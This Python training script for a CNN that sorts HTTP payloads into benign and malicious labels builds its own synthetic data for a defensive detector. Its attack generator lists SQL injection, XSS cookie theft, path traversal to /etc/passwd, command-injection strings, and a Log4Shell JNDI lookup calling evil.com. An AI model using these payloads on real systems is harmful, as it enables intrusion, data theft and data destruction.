"""Mnemosyne training pipeline for the PayloadClassifier CNN.

Generates synthetic labelled payloads, trains the classifier with a
train / validation split, uses cosine-annealing LR scheduling and
early-stopping, then evaluates and saves the best checkpoint.

Usage
-----
::

    cd Ulti_argus
    python -m src.argus_v.mnemosyne.pytorch_train          # defaults
    python -m src.argus_v.mnemosyne.pytorch_train --epochs 30 --lr 1e-4

Environment
-----------
``MNEMOSYNE_MODEL_DIR``  — override default model save directory.
"""

from __future__ import annotations

import argparse
import os
import random
import time
from pathlib import Path

import torch
import torch.nn as nn
import torch.optim as optim
from sklearn.metrics import classification_report, confusion_matrix
from torch.utils.data import DataLoader, TensorDataset, random_split

from .pytorch_model import PayloadClassifier

# ── Constants ─────────────────────────────────────────────────────────────

DEFAULT_MODEL_DIR = Path(
    os.environ.get("MNEMOSYNE_MODEL_DIR", "models")
)

INPUT_LEN = 1024

# ── Synthetic payload generators ──────────────────────────────────────────

def _rand_headers() -> bytes:
    uas = [
        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        b"python-requests/2.31.0",
        b"curl/7.81.0",
    ]
    hosts = [b"api.internal", b"www.example.com", b"service.mesh", b"10.0.0.5"]
    parts = [
        b"Host: " + random.choice(hosts) + b"\r\n",
        b"User-Agent: " + random.choice(uas) + b"\r\n",
        b"Accept: " + random.choice([b"*/*", b"application/json"]) + b"\r\n",
        b"Connection: keep-alive\r\n",
    ]
    random.shuffle(parts)
    return b"".join(parts[: random.randint(2, 4)])


def _gen_normal() -> list[int]:
    """Realistic benign HTTP payload."""
    hardcoded = [
        b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
        b"POST /login HTTP/1.1\r\nHost: example.com\r\n\r\nuser=admin&pass=pw",
    ]
    if random.random() > 0.75:
        payload = random.choice(hardcoded)
    else:
        method = random.choice([b"GET", b"POST", b"PUT"])
        paths = [b"/", b"/api/v1/data", b"/search", b"/static/app.js", b"/health"]
        payload = method + b" " + random.choice(paths) + b" HTTP/1.1\r\n"
        payload += _rand_headers()
        if method in (b"POST", b"PUT"):
            bodies = [
                b'{"id": 42, "status": "ok"}',
                b"user=alice&token=" + os.urandom(8).hex().encode(),
            ]
            body = random.choice(bodies)
            payload += b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
        else:
            payload += b"\r\n"
    data = list(payload[:INPUT_LEN])
    return data + [0] * (INPUT_LEN - len(data))


def _gen_attack() -> list[int]:
    """Malicious payload spanning multiple attack families."""
    atk = random.choice(["sqli", "xss", "traversal", "cmd", "overflow", "log4shell", "c2"])
    method = random.choice([b"GET", b"POST"])
    path = random.choice([b"/", b"/api/v1/check", b"/login", b"/search"])

    body = b""
    if atk == "sqli":
        inj = random.choice([
            b"' OR '1'='1", b"admin'--", b"UNION SELECT 1,2",
            b"'; DROP TABLE users;--", b"\" OR \"1\"=\"1",
        ])
        path += b"?id=" + inj if method == b"GET" else b""
        body = b"user=" + inj if method == b"POST" else b""
    elif atk == "xss":
        inj = random.choice([
            b"<script>alert(1)</script>", b"<img src=x onerror=alert(1)>",
            b"javascript:alert(document.cookie)", b"<svg/onload=alert(1)>",
        ])
        path += b"?q=" + inj if method == b"GET" else b""
        body = b"data=" + inj if method == b"POST" else b""
    elif atk == "traversal":
        path = random.choice([b"/../../../../etc/passwd", b"/..%2f..%2fboot.ini"])
    elif atk == "cmd":
        inj = random.choice([b"; ls -la", b"&& id", b"| cat /etc/passwd", b"$(whoami)"])
        path += b"?cmd=" + inj if method == b"GET" else b""
        body = b"input=" + inj if method == b"POST" else b""
    elif atk == "overflow":
        path = b"/" + b"A" * 800
    elif atk == "log4shell":
        path = b"/${jndi:ldap://evil.com/a}"
    else:  # c2
        body = os.urandom(random.randint(64, 256))

    payload = method + b" " + path + b" HTTP/1.1\r\n" + _rand_headers()
    if body:
        payload += b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    else:
        payload += b"\r\n"
    data = list(payload[:INPUT_LEN])
    return data + [0] * (INPUT_LEN - len(data))


def generate_dataset(
    n_normal: int = 6000,
    n_attack: int = 6000,
) -> tuple[torch.Tensor, torch.Tensor]:
    """Return ``(data, labels)`` tensors. Labels: 0=benign, 1=malicious."""
    samples, labels = [], []
    for _ in range(n_normal):
        samples.append(_gen_normal())
        labels.append(0)
    for _ in range(n_attack):
        samples.append(_gen_attack())
        labels.append(1)
    combined = list(zip(samples, labels, strict=True))
    random.shuffle(combined)
    samples[:], labels[:] = zip(*combined, strict=True)
    X = torch.tensor(samples, dtype=torch.float32).div_(255.0)
    y = torch.tensor(labels, dtype=torch.long)
    return X, y


# ── Training loop ─────────────────────────────────────────────────────────

def train(
    epochs: int = 20,
    lr: float = 3e-4,
    batch_size: int = 64,
    val_ratio: float = 0.15,
    patience: int = 5,
    n_normal: int = 6000,
    n_attack: int = 6000,
    save_dir: Path = DEFAULT_MODEL_DIR,
) -> None:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    print(f"[*] Device: {device}")

    # ── Data ──────────────────────────────────────────────────────────
    X, y = generate_dataset(n_normal, n_attack)
    dataset = TensorDataset(X, y)
    n_val = int(len(dataset) * val_ratio)
    n_train = len(dataset) - n_val
    train_ds, val_ds = random_split(dataset, [n_train, n_val])
    train_dl = DataLoader(train_ds, batch_size=batch_size, shuffle=True)
    val_dl = DataLoader(val_ds, batch_size=batch_size)

    print(f"[*] Dataset: {n_train} train / {n_val} val")

    # ── Model ─────────────────────────────────────────────────────────
    model = PayloadClassifier(input_len=INPUT_LEN).to(device)
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.AdamW(model.parameters(), lr=lr, weight_decay=1e-4)
    scheduler = optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=epochs)

    best_val_acc = 0.0
    best_state = None
    no_improve = 0

    # ── Loop ──────────────────────────────────────────────────────────
    for epoch in range(1, epochs + 1):
        t0 = time.time()

        # Train
        model.train()
        train_loss, train_correct, train_total = 0.0, 0, 0
        for X_b, y_b in train_dl:
            X_b = X_b.unsqueeze(1).to(device)
            y_b = y_b.to(device)
            optimizer.zero_grad()
            logits = model(X_b)
            loss = criterion(logits, y_b)
            loss.backward()
            optimizer.step()
            train_loss += loss.item() * y_b.size(0)
            train_correct += (logits.argmax(1) == y_b).sum().item()
            train_total += y_b.size(0)

        scheduler.step()

        # Validate
        model.eval()
        val_loss, val_correct, val_total = 0.0, 0, 0
        with torch.no_grad():
            for X_b, y_b in val_dl:
                X_b = X_b.unsqueeze(1).to(device)
                y_b = y_b.to(device)
                logits = model(X_b)
                loss = criterion(logits, y_b)
                val_loss += loss.item() * y_b.size(0)
                val_correct += (logits.argmax(1) == y_b).sum().item()
                val_total += y_b.size(0)

        t_acc = train_correct / train_total * 100
        v_acc = val_correct / val_total * 100

        elapsed = time.time() - t0
        lr_now = scheduler.get_last_lr()[0]
        print(
            f"  Epoch {epoch:>3}/{epochs} │ "
            f"train {train_loss / train_total:.4f} / {t_acc:.1f}% │ "
            f"val {val_loss / val_total:.4f} / {v_acc:.1f}% │ "
            f"lr={lr_now:.2e} │ {elapsed:.1f}s"
        )

        # Early stopping
        if v_acc > best_val_acc:
            best_val_acc = v_acc
            best_state = model.state_dict().copy()
            no_improve = 0
        else:
            no_improve += 1
            if no_improve >= patience:
                print(f"[!] Early stopping after {patience} epochs without improvement")
                break

    # ── Restore best & evaluate ───────────────────────────────────────
    if best_state:
        model.load_state_dict(best_state)
    model.eval()

    all_preds, all_labels = [], []
    with torch.no_grad():
        for X_b, y_b in val_dl:
            X_b = X_b.unsqueeze(1).to(device)
            logits = model(X_b)
            all_preds.extend(logits.argmax(1).cpu().numpy())
            all_labels.extend(y_b.numpy())

    print("\n" + "=" * 50)
    print("Validation Classification Report")
    print("=" * 50)
    print(classification_report(
        all_labels, all_preds,
        target_names=["Benign", "Malicious"],
        zero_division=0,
    ))

    cm = confusion_matrix(all_labels, all_preds)
    print("Confusion Matrix:")
    print(f"  {'':>12} Pred:Benign  Pred:Malicious")
    for i, name in enumerate(["Benign", "Malicious"]):
        row = cm[i] if i < len(cm) else [0, 0]
        print(f"  {name:>12}  {'  '.join(f'{v:>12}' for v in row)}")

    # ── Save ──────────────────────────────────────────────────────────
    save_dir.mkdir(parents=True, exist_ok=True)
    ckpt = save_dir / "payload_classifier.pth"
    torch.save(model.state_dict(), ckpt)
    print(f"\n[+] Best model saved → {ckpt}  (val acc: {best_val_acc:.1f}%)")


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Train Mnemosyne PayloadClassifier")
    parser.add_argument("--epochs", type=int, default=20)
    parser.add_argument("--lr", type=float, default=3e-4)
    parser.add_argument("--batch-size", type=int, default=64)
    parser.add_argument("--val-ratio", type=float, default=0.15)
    parser.add_argument("--patience", type=int, default=5)
    parser.add_argument("--n-normal", type=int, default=6000)
    parser.add_argument("--n-attack", type=int, default=6000)
    parser.add_argument("--save-dir", type=str, default=str(DEFAULT_MODEL_DIR))
    args = parser.parse_args()
    train(
        epochs=args.epochs,
        lr=args.lr,
        batch_size=args.batch_size,
        val_ratio=args.val_ratio,
        patience=args.patience,
        n_normal=args.n_normal,
        n_attack=args.n_attack,
        save_dir=Path(args.save_dir),
    )


if __name__ == "__main__":
    main()
